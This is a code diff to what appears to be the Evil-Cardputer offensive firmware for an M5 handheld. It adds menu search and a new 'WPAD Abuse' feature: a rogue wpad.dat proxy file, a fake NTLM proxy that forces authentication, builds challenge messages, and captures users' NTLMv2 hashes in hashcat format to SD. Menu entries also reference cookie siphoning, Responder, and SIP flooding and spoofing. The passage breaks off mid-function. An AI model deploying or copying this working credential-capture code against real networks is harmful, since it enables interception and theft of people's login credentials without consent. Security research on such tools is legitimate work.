@@ -31,6 +31,19 @@
 struct StreamItem;
 struct UrlParts;
 
+typedef struct {
+  uint32_t state[4];
+  uint32_t count[2];
+  uint8_t buffer[64];
+} MD4_CTX;
+
+typedef struct {
+  uint32_t state[4];   // A, B, C, D
+  uint32_t count[2];   // nb bits (mod 2^64)
+  uint8_t  buffer[64]; // bloc en cours
+} MD5U_CTX;
+
+
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
@@ -178,6 +191,9 @@ static const char * const PROGMEM menuItems[] = {
   "EvilChatMesh",
   "SD on USB",
   "Responder",
+  "WPAD Abuse",
+  "Crack NTLMv2",
+  "Clean NTLMv2 duplicate",
   "FileManager",
   "UART Shell",
   "SIP Scanner",
@@ -832,7 +848,7 @@ void setup() {
   const char* randomMessage = startUpMessages[randomIndex];
 
   SPI.begin(SCK, MISO, MOSI, -1);
-  if (!SD.begin()) {
+  if (!SD.begin(12, SPI, 40000000UL)) {
     Serial.println(F("Error.."));
     Serial.println(F("SD card not mounted..."));
     M5.Display.fillRect(0, 0, 240, 135, menuBackgroundColor);
@@ -957,7 +973,8 @@ void setup() {
   restoreConfigParameter("evilChatNickname");
   restoreConfigParameter("portal_file");
   restoreConfigParameter("cloned_ssid");
-
+  restoreConfigParameter("portal_password");
+  
   int textY = 30;
   int lineOffset = 10;
   int lineY1 = textY - lineOffset;
@@ -973,7 +990,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.4.3 2025";
+  const char* text3 = "v1.4.4 2025";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -1003,7 +1020,7 @@ void setup() {
   Serial.println(F("-------------------"));
   Serial.println(F("Evil-Cardputer"));
   Serial.println(F("By 7h30th3r0n3"));
-  Serial.println(F("v1.4.3 2025"));
+  Serial.println(F("v1.4.4 2025"));
   Serial.println(F("-------------------"));
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -1341,30 +1358,170 @@ void loop() {
   }
 }
 
+
+
+//-----------------------------------------------------------------------------------------------------
+// --- Recherche dans le menu : version zéro-alloc ---
+enum MenuMode { MENU_NAVIGATION, MENU_SEARCH };
+MenuMode menuMode = MENU_NAVIGATION;
+
+// Requête bornée
+static char menuSearchQuery[17] = {0};  // 16 + '\0'
+static uint8_t menuSearchLen = 0;
+
+// Vue filtrée bornée
+static int16_t menuFilteredIdx[menuSize];
+static int16_t menuFilteredCount = 0;
+
+static bool menuFilterLocked = false;          // navigation sur vue filtrée
+static unsigned long searchLastKeyTime = 0;
+static const unsigned long searchKeyRepeatDelay = 120; // ms
+
+// Debounce pour S : on attend le relâchement après l'entrée en mode recherche
+static bool searchWaitForSRelease = false;
+// --- fin recherche zéro-alloc ---
+
+static inline char lc(char c) { return (c >= 'A' && c <= 'Z') ? (c + 32) : c; }
+
+static bool icase_contains_flash(const char* hay, const char* needle, uint8_t nlen) {
+  if (nlen == 0) return true;
+  for (uint16_t i = 0; hay[i]; ++i) {
+    if (lc(hay[i]) == lc(needle[0])) {
+      uint8_t j = 1;
+      while (needle[j] && hay[i + j] && (lc(hay[i + j]) == lc(needle[j]))) ++j;
+      if (j == nlen) return true;
+    }
+  }
+  return false;
+}
+
+void rebuildMenuFilter() {
+  menuFilteredCount = 0;
+  if (menuSearchLen == 0) {
+    for (int i = 0; i < menuSize; ++i) menuFilteredIdx[menuFilteredCount++] = i;
+    Serial.printf("[SEARCH] query='(empty)' -> %d match(es)\n", (int)menuFilteredCount);
+    return;
+  }
+  for (int i = 0; i < menuSize; ++i) {
+    const char* it = (const char*)menuItems[i];
+    if (icase_contains_flash(it, menuSearchQuery, menuSearchLen)) {
+      menuFilteredIdx[menuFilteredCount++] = i;
+    }
+  }
+  Serial.printf("[SEARCH] query='%s' -> %d match(es)\n", menuSearchQuery, (int)menuFilteredCount);
+}
+
+int viewCount() {
+  return (menuMode == MENU_SEARCH || menuFilterLocked) ? (int)menuFilteredCount : menuSize;
+}
+
+int mapViewToRealIndex(int pos) {
+  if (menuMode == MENU_SEARCH || menuFilterLocked) {
+    if (pos < 0 || pos >= (int)menuFilteredCount) return 0;
+    return menuFilteredIdx[pos];
+  }
+  return pos;
+}
+
+void clampMenuSelection() {
+  int total = viewCount();
+  if (total <= 0) { currentIndex = 0; menuStartIndex = 0; return; }
+  if (currentIndex >= total) currentIndex = total - 1;
+  if (currentIndex < 0) currentIndex = 0;
+  menuStartIndex = std::max(0, std::min(currentIndex, total - maxMenuDisplay));
+}
+
+char getPrintableKey() {
+  for (int c = 32; c <= 126; ++c) {
+    if (M5Cardputer.Keyboard.isKeyPressed((char)c)) return (char)c;
+  }
+  return 0;
+}
+
+void drawSearchBar() {
+  const int barH = 12;
+  const int y = M5.Display.height() - barH;
+  M5.Display.fillRect(0, y, M5.Display.width(), barH, TFT_BLACK);
+  M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
+  M5.Display.setCursor(0, y + 1);
+  M5.Display.print("Search: ");
+  M5.Display.print(menuSearchQuery);
+}
+
+void enterSearchMode() {
+  if (menuMode != MENU_SEARCH) {
+    menuMode = MENU_SEARCH;
+    menuFilterLocked = false;
+    rebuildMenuFilter();
+    currentIndex = 0;
+    menuStartIndex = 0;
+    lastIndex = -1;
+    Serial.println("[SEARCH] enter");
+  }
+  drawMenu();
+  drawSearchBar();
+}
+
+// Quitte la recherche : si query vide => menu complet (pas de filtre verrouillé),
+// sinon on verrouille la vue filtrée
+void exitSearchModeAuto() {
+  menuMode = MENU_NAVIGATION;
+  menuFilterLocked = (menuSearchLen > 0);
+  clampMenuSelection();
+  lastIndex = -1;
+  Serial.printf("[SEARCH] exit -> %s\n", menuFilterLocked ? "keep filtered view" : "full menu");
+  drawMenu();
+}
+
+// BACKSPACE en mode recherche : effacer 1 caractère (si vide, on reste en recherche
+// avec liste complète)
+void clearSearchBackspaceOne() {
+  if (menuSearchLen > 0) {
+    menuSearchQuery[--menuSearchLen] = '\0';
+  }
+  rebuildMenuFilter();
+  currentIndex = 0;
+  menuStartIndex = 0;
+  lastIndex = -1;
+  drawMenu();
+  drawSearchBar();
+}
+
+//-----------------------------------------------------------------------------------------------------
 void drawMenu() {
-  M5.Display.fillRect(0, 13, M5.Display.width(), M5.Display.height() - 13, menuBackgroundColor); // Effacer la partie inférieure de l'écran
-  M5.Display.setTextSize(1.5); // Assurez-vous que la taille du texte est correcte
+  M5.Display.fillRect(0, 13, M5.Display.width(), M5.Display.height() - 13, menuBackgroundColor);
+  M5.Display.setTextSize(1.5);
   M5.Display.setTextFont(1);
 
-  int lineHeight = 13; // Augmentez la hauteur de ligne si nécessaire
-  int startX = 0;
-  int startY = 10; // Ajustez pour laisser de la place pour la barre de tâches
+  const int lineHeight = 13;
+  const int startX = 0;
+  const int startY = 10;
 
-  for (int i = 0; i < maxMenuDisplay; i++) {
-    int menuIndex = menuStartIndex + i;
-    if (menuIndex >= menuSize) break;
+  const int total = viewCount();
 
-    if (menuIndex == currentIndex) {
+  for (int i = 0; i < maxMenuDisplay; ++i) {
+    int pos = menuStartIndex + i;
+    if (pos >= total) break;
+
+    int menuIndex = mapViewToRealIndex(pos);
+
+    if (pos == currentIndex) {
       M5.Display.fillRect(0, 1 + startY + i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
       M5.Display.setTextColor(menuTextFocusedColor);
     } else {
       M5.Display.setTextColor(menuTextUnFocusedColor);
     }
-    M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 3); // Ajustez ici
-    M5.Display.println(menuItems[menuIndex]);
+
+    M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 3);
+    M5.Display.println((const char*)menuItems[menuIndex]);
   }
+
+  if (menuMode == MENU_SEARCH) drawSearchBar();
   M5.Display.display();
 }
+
+
+
 
 
 void executeMenuItem(int index) {
@@ -1430,15 +1587,18 @@ void executeMenuItem(int index) {
     case 56: EvilChatMesh(); break;
     case 57: sdToUsb(); break;
     case 58: responder(); break;
-    case 59: fileManager(); break;
-    case 60: startUARTShell(); break;
-    case 61: sipScan(); break;
-    case 62: sipEnumExtensions(); break;
-    case 63: sipSpoofMessage(); break;
-    case 64: sipFlood(); break;
-    case 65: sipRingAll(); break;
-    case 66: scanCCTVCameras(); break;
-    case 67: showSettingsMenu(); break;
+    case 59: wpadAbuse(); break;
+    case 60: crackNTLMv2(); break;
+    case 61: CleanNTLMHashes(); break;
+    case 62: fileManager(); break;
+    case 63: startUARTShell(); break;
+    case 64: sipScan(); break;
+    case 65: sipEnumExtensions(); break;
+    case 66: sipSpoofMessage(); break;
+    case 67: sipFlood(); break;
+    case 68: sipRingAll(); break;
+    case 69: scanCCTVCameras(); break;
+    case 70: showSettingsMenu(); break;
   }
   isOperationInProgress = false;
 }
@@ -1464,15 +1624,81 @@ void backDebounce() {
 
 void handleMenuInput() {
   static unsigned long lastKeyPressTime = 0;
-  const unsigned long keyRepeatDelay = 150; // Délai entre les répétitions d'appui
+  const unsigned long keyRepeatDelay = 150;
   static bool keyHandled = false;
-  static int previousIndex = -1; // Pour suivre les changements d'index
+  static int previousIndex = -1;
+
   enterDebounce();
   M5.update();
   M5Cardputer.update();
 
-  // Variable pour suivre les changements d'état du menu
   bool stateChanged = false;
+
+  // ----- Ouverture recherche -----
+  if (menuMode == MENU_NAVIGATION) {
+    if (M5Cardputer.Keyboard.isKeyPressed('s') || M5Cardputer.Keyboard.isKeyPressed('S')) {
+      searchWaitForSRelease = true;   // Empêche le 's' de s'ajouter à la requête
+      enterSearchMode();
+      return;
+    }
+  }
+
+  // ----- MODE RECHERCHE -----
+  if (menuMode == MENU_SEARCH) {
+    // Tant que 's' est maintenu après l'entrée, on ne lit aucun caractère
+    if (searchWaitForSRelease) {
+      if (M5Cardputer.Keyboard.isKeyPressed('s') || M5Cardputer.Keyboard.isKeyPressed('S')) {
+        return; // attendre le relâchement
+      } else {
+        searchWaitForSRelease = false;
+      }
+    }
+
+    // BACKSPACE -> effacer 1 char (si vide, liste complète visible)
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      if (millis() - searchLastKeyTime > searchKeyRepeatDelay) {
+        clearSearchBackspaceOne();
+        searchLastKeyTime = millis();
+      }
+      return;
+    }
+
+    // ENTER -> quitter recherche ; si query vide => menu complet, sinon vue filtrée
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      exitSearchModeAuto();
+      return;
+    }
+
+    // Ajout caractère imprimable
+    char typed = getPrintableKey();
+    if (typed != 0) {
+      if (millis() - searchLastKeyTime > searchKeyRepeatDelay) {
+        if (typed != '\n' && typed != '\r') {
+          if (menuSearchLen < sizeof(menuSearchQuery) - 1) {
+            menuSearchQuery[menuSearchLen++] = typed;
+            menuSearchQuery[menuSearchLen] = '\0';
+            rebuildMenuFilter();
+            currentIndex = 0;
+            menuStartIndex = 0;
+            lastIndex = -1;
+            drawMenu();
+            drawSearchBar();
+          } // sinon: buffer plein -> ignore
+          searchLastKeyTime = millis();
+        }
+      }
+      return;
+    }
+
+    // 'S' de nouveau en recherche -> no-op (barre déjà affichée)
+    if (M5Cardputer.Keyboard.isKeyPressed('s') || M5Cardputer.Keyboard.isKeyPressed('S')) {
+      return;
+    }
+    return;
+  }
+
+  // ----- MODE NAVIGATION (liste complète ou filtrée verrouillée) -----
+  int total = viewCount();
 
   if (M5Cardputer.Keyboard.isKeyPressed(KEY_LEFT_CTRL) && M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
     if (millis() - lastKeyPressTime > keyRepeatDelay) {
@@ -1481,67 +1707,69 @@ void handleMenuInput() {
       stateChanged = true;
     }
     keyHandled = true;
+
   } else if (M5Cardputer.Keyboard.isKeyPressed(';')) {
     if (millis() - lastKeyPressTime > keyRepeatDelay) {
       currentIndex--;
-      if (currentIndex < 0) {
-        currentIndex = menuSize - 1;  // Boucle à la fin du menu
-      }
+      if (currentIndex < 0) currentIndex = total - 1;
       lastKeyPressTime = millis();
       stateChanged = true;
     }
     keyHandled = true;
+
   } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
     if (millis() - lastKeyPressTime > keyRepeatDelay) {
       currentIndex++;
-      if (currentIndex >= menuSize) {
-        currentIndex = 0;  // Boucle au début du menu
-      }
+      if (currentIndex >= total) currentIndex = 0;
       lastKeyPressTime = millis();
       stateChanged = true;
     }
     keyHandled = true;
+
   } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
     if (millis() - lastKeyPressTime > keyRepeatDelay) {
       currentIndex += 3;
-      if (currentIndex >= menuSize) {
-        currentIndex %= menuSize;  // Boucle au début du menu
-      }
+      if (currentIndex >= total) currentIndex %= std::max(1, total);
       lastKeyPressTime = millis();
       stateChanged = true;
     }
     keyHandled = true;
+
   } else if (M5Cardputer.Keyboard.isKeyPressed(',')) {
     if (millis() - lastKeyPressTime > keyRepeatDelay) {
       currentIndex -= 3;
-      if (currentIndex < 0) {
-        currentIndex = (menuSize + currentIndex) % menuSize;  // Boucle à la fin du menu
-      }
+      while (currentIndex < 0) currentIndex += std::max(1, total);
       lastKeyPressTime = millis();
       stateChanged = true;
     }
     keyHandled = true;
+
   } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    executeMenuItem(currentIndex);
+    int realIndex = mapViewToRealIndex(currentIndex);
+    executeMenuItem(realIndex);
     stateChanged = true;
     keyHandled = true;
+
+  } else if (M5Cardputer.Keyboard.isKeyPressed('s') || M5Cardputer.Keyboard.isKeyPressed('S')) {
+    searchWaitForSRelease = true;  // debounce pour éviter 's' dans la requête à l'ouverture
+    enterSearchMode();
+    return;
+
   } else {
-    // Aucune touche pertinente n'est pressée, réinitialise le drapeau
     keyHandled = false;
   }
 
-  // Réinitialise l'heure de la dernière pression si aucune touche n'est pressée
-  if (!keyHandled) {
-    lastKeyPressTime = 0;
-  }
+  if (!keyHandled) lastKeyPressTime = 0;
 
-  // Met à jour l'affichage uniquement si l'état du menu a changé
   if (stateChanged || currentIndex != previousIndex) {
-    menuStartIndex = max(0, min(currentIndex, menuSize - maxMenuDisplay));
+    clampMenuSelection();
     drawMenu();
-    previousIndex = currentIndex; // Mise à jour de l'index précédent
+    previousIndex = currentIndex;
   }
 }
+
+
+
 
 
 
@@ -2290,6 +2518,11 @@ void handleLogRequest() {
     "\x44\x01\x00\x3b");
 }
 
+const char wpad_dat[] PROGMEM = R"RAW(
+function FindProxyForURL(url, host) {
+  return "PROXY 192.168.4.1:80; DIRECT";
+}
+)RAW";
 
 
 /*
@@ -2297,6 +2530,7 @@ void handleLogRequest() {
 Captive portal
 ============================================================================================================================
 */
+
 
 void createCaptivePortal() {
   String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
@@ -2340,7 +2574,10 @@ void createCaptivePortal() {
   
   server.on("/siphon", handleCookieSiphoning);
   server.on("/logcookie", handleLogRequest);
-
+  server.on("/wpad.dat", HTTP_GET, []() {
+    Serial.println("[+] WPAD request, sending proxy!!!");
+    server.send_P(200, "application/x-ns-proxy-autoconfig", wpad_dat);
+  });
   
   server.on("/", HTTP_GET, []() {
     String email = server.arg("email");
@@ -2855,6 +3092,709 @@ void createCaptivePortal() {
     waitAndReturnToMenu("Portal " + ssid + " Deployed");
   }
 }
+
+
+/*
+============================================================================================================================
+Abusing WPAD
+https://datatracker.ietf.org/doc/html/draft-ietf-wrec-wpad-01#section-4.4.1
+https://learn.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a
+============================================================================================================================
+*/
+
+#include "mbedtls/base64.h"
+
+// --- Servers
+WiFiServer proxy(80);
+
+// =================== Utils ===================
+
+static inline void le16(std::vector<uint8_t>& v, uint16_t x){ v.push_back(x & 0xFF); v.push_back((x>>8)&0xFF); }
+static inline void le32(std::vector<uint8_t>& v, uint32_t x){
+  v.push_back(uint8_t(x)); v.push_back(uint8_t(x>>8)); v.push_back(uint8_t(x>>16)); v.push_back(uint8_t(x>>24));
+}
+static inline void push8(std::vector<uint8_t>& v, uint8_t x){ v.push_back(x); }
+
+String base64Encode(const uint8_t *data, size_t len) {
+  size_t out_len = 0, out_size = 4 * ((len + 2) / 3) + 1;
+  unsigned char *out_buf = (unsigned char*)malloc(out_size);
+  if (!out_buf) return "";
+  int ret = mbedtls_base64_encode(out_buf, out_size, &out_len, data, len);
+  if (ret != 0) { Serial.printf("[-] Base64 encode error: %d\n", ret); free(out_buf); return ""; }
+  out_buf[out_len] = '\0';
+  String s((char*)out_buf); free(out_buf); return s;
+}
+
+bool base64Decode(const String& b64, std::vector<uint8_t>& out) {
+  size_t need = (b64.length()*3)/4 + 4;
+  out.resize(need);
+  size_t outLen = 0;
+  int ret = mbedtls_base64_decode(out.data(), out.size(), &outLen,
+                                  (const unsigned char*)b64.c_str(), b64.length());
+  if (ret != 0 || outLen < 12) return false;
+  out.resize(outLen);
+  return true;
+}
+
+int detectNtlmMessageType(const String &b64) {
+  std::vector<uint8_t> buf;
+  if (!base64Decode(b64, buf)) { Serial.println("[-] Base64 decode failed / Type detection"); return -1; }
+  if (buf.size() < 12 || memcmp(buf.data(), "NTLMSSP", 7) != 0) { Serial.println("[-] Not NTLMSSP"); return -1; }
+  uint32_t t = (uint32_t)buf[8] | ((uint32_t)buf[9]<<8) | ((uint32_t)buf[10]<<16) | ((uint32_t)buf[11]<<24);
+  Serial.printf("[DEBUG] NTLM MessageType=%u\n", t);
+  return (int)t;
+}
+
+// =================== Hashcat & UI helpers ===================
+
+static uint8_t ntlmLastChallenge[8]; // NTLMv2 challenge
+static bool ntlmActiveCapture = false;
+static String ntlmLastUser = "";
+static String ntlmLastDomain = "";
+static String ntlmLastClient = "";
+static int ntlmHashCount = 0;
+
+String toHex(const uint8_t* data, size_t len) {
+  String s; s.reserve(len * 2);
+  for (size_t i = 0; i < len; i++) {
+    char buf[3];
+    sprintf(buf, "%02x", data[i]);
+    s += buf;
+  }
+  return s;
+}
+
+void saveHashcatFormat(const std::vector<uint8_t>& buf, const IPAddress &clientIP) {
+  if (buf.size() < 64) return;
+
+  auto le16v = [&](size_t off){ return (uint16_t)(buf[off] | (buf[off+1]<<8)); };
+  auto le32v = [&](size_t off){ return (uint32_t)(buf[off] | (buf[off+1]<<8) | (buf[off+2]<<16) | (buf[off+3]<<24)); };
+
+  uint16_t domLen = le16v(28), domOff = le32v(32);
+  uint16_t userLen = le16v(36), userOff = le32v(40);
+  uint16_t ntLen   = le16v(20), ntOff   = le32v(24);
+
+  String domain, username;
+  for (int i=0; i<domLen; i+=2) domain += (char)buf[domOff+i];
+  for (int i=0; i<userLen; i+=2) username += (char)buf[userOff+i];
+
+  std::vector<uint8_t> ntResp(buf.begin()+ntOff, buf.begin()+ntOff+ntLen);
+  if (ntResp.size() < 16) return;
+
+  String serverChal = toHex(ntlmLastChallenge, 8);
+  String ntHashPart = toHex(ntResp.data(), 16);
+  String blobPart   = toHex(ntResp.data()+16, ntResp.size()-16);
+
+  String hashcatLine = "------------------------------------\n" + username + "::" + domain + ":" + serverChal + ":" + ntHashPart + ":" + blobPart;
+
+  File f = SD.open("/evil/NTLM/ntlm_hashes.txt", FILE_APPEND);
+  if (f) {
+    f.println(hashcatLine);
+    f.close();
+    Serial.println("[+] NTLMv2 hash saved to /evil/NTLM/ntlm_hashes.txt");
+    Serial.println(hashcatLine);
+  }
+
+  ntlmLastUser   = username;
+  ntlmLastDomain = domain;
+  ntlmLastClient = clientIP.toString();
+  ntlmActiveCapture = true;
+  ntlmHashCount++;
+}
+
+// =================== NTLM Type 2 builder ===================
+
+enum {
+  NTLM_NEGOTIATE_UNICODE              = 0x00000001,
+  NTLM_REQUEST_TARGET                 = 0x00000004,
+  NTLM_NEGOTIATE_NTLM                 = 0x00000200,
+  NTLM_NEGOTIATE_EXTENDED_SESSIONSEC  = 0x00080000,
+  NTLM_NEGOTIATE_TARGET_INFO          = 0x00800000,
+  NTLM_NEGOTIATE_VERSION              = 0x02000000
+};
+
+enum {
+  MsvAvEOL             = 0x0000,
+  MsvAvNbComputerName  = 0x0001,
+  MsvAvNbDomainName    = 0x0002,
+  MsvAvDnsComputerName = 0x0003,
+  MsvAvDnsDomainName   = 0x0004
+};
+
+static void pushUTF16LE(std::vector<uint8_t>& v, const char* ascii) {
+  while (*ascii) { push8(v, (uint8_t)*ascii); push8(v, 0x00); ++ascii; }
+}
+
+static void avPair(std::vector<uint8_t>& ti, uint16_t type, const char* ascii) {
+  std::vector<uint8_t> val; pushUTF16LE(val, ascii);
+  le16(ti, type);
+  le16(ti, (uint16_t)val.size());
+  ti.insert(ti.end(), val.begin(), val.end());
+}
+
+std::vector<uint8_t> buildType2Challenge() {
+  const char* TargetNameAscii = "EVILGROUP";
+  const char* NbDomain        = "EVILGROUP";
+  const char* NbComputer      = "EVILPROXY";
+  const char* DnsDomain       = "lan";
+  const char* DnsComputer     = "evilm5.lan";
+  
+  std::vector<uint8_t> hdr; hdr.reserve(256);
+
+  const char sig[] = "NTLMSSP";
+  hdr.insert(hdr.end(), sig, sig + 7); push8(hdr, 0x00);
+  le32(hdr, 0x00000002);
+
+  size_t offTargetLen = hdr.size(); le16(hdr, 0); le16(hdr, 0); le32(hdr, 0);
+
+  uint32_t flags = NTLM_NEGOTIATE_UNICODE | NTLM_REQUEST_TARGET | NTLM_NEGOTIATE_NTLM |
+                   NTLM_NEGOTIATE_EXTENDED_SESSIONSEC | NTLM_NEGOTIATE_TARGET_INFO |
+                   NTLM_NEGOTIATE_VERSION;
+  le32(hdr, flags);
+
+  for (int i=0;i<8;i++) {
+    ntlmLastChallenge[i] = (uint8_t)(esp_random() & 0xFF);
+    push8(hdr, ntlmLastChallenge[i]);
+  }
+
+  for (int i=0;i<8;i++) push8(hdr, 0x00);
+
+  size_t offTILen = hdr.size(); le16(hdr, 0); le16(hdr, 0); le32(hdr, 0);
+
+  push8(hdr, 0x0A); push8(hdr, 0x00);
+  le16(hdr, 18362);
+  push8(hdr, 0x00); push8(hdr, 0x00); push8(hdr, 0x00);
+  push8(hdr, 0x0F);
+
+  uint32_t varStart = (uint32_t)hdr.size();
+
+  std::vector<uint8_t> targetName; pushUTF16LE(targetName, TargetNameAscii);
+  uint16_t tnLen = (uint16_t)targetName.size();
+  uint32_t tnOff = varStart;
+  hdr.insert(hdr.end(), targetName.begin(), targetName.end());
+
+  std::vector<uint8_t> ti;
+  avPair(ti, MsvAvNbDomainName,   NbDomain);
+  avPair(ti, MsvAvNbComputerName, NbComputer);
+  avPair(ti, MsvAvDnsDomainName,  DnsDomain);
+  avPair(ti, MsvAvDnsComputerName,DnsComputer);
+  le16(ti, MsvAvEOL); le16(ti, 0);
+
+  uint16_t tiLen = (uint16_t)ti.size();
+  uint32_t tiOff = tnOff + tnLen;
+  hdr.insert(hdr.end(), ti.begin(), ti.end());
+
+  hdr[offTargetLen + 0] = (uint8_t)(tnLen & 0xFF);
+  hdr[offTargetLen + 1] = (uint8_t)(tnLen >> 8);
+  hdr[offTargetLen + 2] = (uint8_t)(tnLen & 0xFF);
+  hdr[offTargetLen + 3] = (uint8_t)(tnLen >> 8);
+  hdr[offTargetLen + 4] = (uint8_t)(tnOff & 0xFF);
+  hdr[offTargetLen + 5] = (uint8_t)((tnOff >> 8) & 0xFF);
+  hdr[offTargetLen + 6] = (uint8_t)((tnOff >> 16) & 0xFF);
+  hdr[offTargetLen + 7] = (uint8_t)((tnOff >> 24) & 0xFF);
+
+  hdr[offTILen + 0] = (uint8_t)(tiLen & 0xFF);
+  hdr[offTILen + 1] = (uint8_t)(tiLen >> 8);
+  hdr[offTILen + 2] = (uint8_t)(tiLen & 0xFF);
+  hdr[offTILen + 3] = (uint8_t)(tiLen >> 8);
+  hdr[offTILen + 4] = (uint8_t)(tiOff & 0xFF);
+  hdr[offTILen + 5] = (uint8_t)((tiOff >> 8) & 0xFF);
+  hdr[offTILen + 6] = (uint8_t)((tiOff >> 16) & 0xFF);
+  hdr[offTILen + 7] = (uint8_t)((tiOff >> 24) & 0xFF);
+
+  return hdr;
+}
+
+// =================== HTTP Helpers ===================
+
+static String httpReadLine(WiFiClient &c, uint32_t to_ms=3000) {
+  String s; s.reserve(128);
+  uint32_t t0 = millis();
+  while (millis()-t0 < to_ms) {
+    while (c.available()) {
+      char ch = c.read();
+      s += ch;
+      if (ch == '\n') return s;
+    }
+    delay(1);
+  }
+  return s;
+}
+
+static String httpReadHeaders(WiFiClient &c, uint32_t to_ms=4000){
+  String h; h.reserve(1024);
+  uint32_t t0 = millis();
+  while (millis()-t0 < to_ms) {
+    while (c.available()) {
+      char ch = c.read();
+      h += ch;
+      if (h.endsWith("\r\n\r\n")) return h;
+    }
+    delay(1);
+  }
+  return h;
+}
+
+// =================== 407 helpers ===================
+
+void sendInitial407(WiFiClient &client) {
+  client.print(
+    "HTTP/1.1 407 Proxy Authentication Required\r\n"
+    "Proxy-Authenticate: NTLM\r\n"
+    "Connection: close\r\n"
+    "Content-Length: 0\r\n\r\n"
+  );
+  client.flush();
+  client.stop();
+  Serial.println("[*] Sent initial 407 (NTLM only)");
+}
+
+void sendType2_407(WiFiClient &client, const String& type2b64) {
+  client.print(
+    "HTTP/1.1 407 Proxy Authentication Required\r\n"
+    "Proxy-Authenticate: NTLM " + type2b64 + "\r\n"
+    "Proxy-Connection: Keep-Alive\r\n"
+    "Connection: Keep-Alive\r\n"
+    "Content-Length: 0\r\n\r\n"
+  );
+  client.flush();
+  Serial.println("[+] Sent 407 with NTLM Type2");
+}
+
+// =================== Main handler ===================
+
+void handleNTLMClient(WiFiClient &client) {
+  if (!client.connected()) return;
+
+  String reqLine = httpReadLine(client);
+  reqLine.trim();
+  if (reqLine.length()==0) return;
+  Serial.println("[*] First line: " + reqLine);
+
+  String headers = httpReadHeaders(client);
+
+  if (reqLine.startsWith("GET /wpad.dat")) {
+    client.print("HTTP/1.1 200 OK\r\n");
+    client.print("Content-Type: application/x-ns-proxy-autoconfig\r\n");
+    client.print("Content-Length: "); client.print(strlen_P(wpad_dat)); client.print("\r\n\r\n");
+    client.print(wpad_dat);
+    Serial.println("[*] Served wpad.dat");
+    return;
+  }
+
+  String headersL = headers; headersL.toLowerCase();
+  int hIdx = headersL.indexOf("proxy-authorization:");
+  bool sawNTLM = false; String ntlmB64;
+
+  if (hIdx >= 0) {
+    int lineEnd = headers.indexOf("\r\n", hIdx);
+    String line = headers.substring(hIdx, (lineEnd>hIdx)?lineEnd:headers.length());
+    line.replace("\t"," "); while (line.indexOf("  ")>=0) line.replace("  "," ");
+    String lineL = line; lineL.toLowerCase();
+
+    int ntIdx = lineL.indexOf("proxy-authorization: ntlm ");
+    if (ntIdx >= 0) {
+      ntlmB64 = line.substring(ntIdx + strlen("proxy-authorization: ntlm "));
+      ntlmB64.trim();
+      sawNTLM = true;
+    }
+  }
+
+  if (!sawNTLM) {
+    sendInitial407(client);
+    return;
+  }
+
+  int mtype = detectNtlmMessageType(ntlmB64);
+  if (mtype == 1) {
+    auto t2 = buildType2Challenge();
+    String t2b64 = base64Encode(t2.data(), t2.size());
+    sendType2_407(client, t2b64);
+
+    String rl2 = httpReadLine(client, (uint32_t)4000); rl2.trim();
+    if (rl2.length()==0) { Serial.println("[-] Timeout (Type3)"); return; }
+    Serial.println("[*] Next request: " + rl2);
+
+    String h2 = httpReadHeaders(client, (uint32_t)4000);
+    String h2L = h2; h2L.toLowerCase();
+    int i2 = h2L.indexOf("proxy-authorization: ntlm ");
+    if (i2 >= 0) {
+      int e2 = h2.indexOf("\r\n", i2);
+      String line2 = h2.substring(i2, (e2>i2)?e2:h2.length());
+      String b642 = line2.substring(strlen("proxy-authorization: ntlm "));
+      b642.trim();
+      int m2 = detectNtlmMessageType(b642);
+      if (m2 == 3) {
+        Serial.println("[!!!] Received NTLM Type3");
+        std::vector<uint8_t> raw;
+        if (base64Decode(b642, raw)) {
+          saveHashcatFormat(raw, client.remoteIP());
+        }
+        client.print("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n");
+        client.flush();
+        return;
+      }
+    }
+    return;
+  }
+  else if (mtype == 3) {
+    Serial.println("[!!!] Direct NTLM Type3 received");
+    std::vector<uint8_t> raw;
+    if (base64Decode(ntlmB64, raw)) {
+      saveHashcatFormat(raw, client.remoteIP());
+    }
+    client.print("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n");
+    client.flush();
+    return;
+  }
+
+  sendInitial407(client);
+}
+
+// =================== Sonar Animation ===================
+#include <cmath>
+#define PI 3.14159265f
+static unsigned long lastRadarUpdate = 0;
+static unsigned long radarInterval   = 250; // ms
+static String uiLastUser   = "";
+static String uiLastDomain = "";
+static String uiLastClient = "";
+static int    uiLastCount  = -1;
+
+
+// --- CONFIGURATION RADAR ---
+const int RADAR_R        = 50;   // rayon du radar (px)
+const int RADAR_MARGIN   = 10;   // marge autour
+const int MAX_DETECTIONS = 10;   // nombre max de points simultanés
+const int DET_TTL        = 60 ;   // durée de vie initiale des points (frames)
+
+struct DetPoint {
+  int x, y;
+  int ttl;   // durée de vie restante en frames
+};
+DetPoint detections[MAX_DETECTIONS];
+int detCount = 0;
+
+float currentAngle = 0.0f;
+int currentCx = 0, currentCy = 0, currentR = RADAR_R;
+
+
+static inline uint16_t rgb565(uint8_t r,uint8_t g,uint8_t b){
+  return ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3);
+}
+
+static void hsv2rgb(uint16_t H, uint8_t S, uint8_t V, uint8_t &r, uint8_t &g, uint8_t &b) {
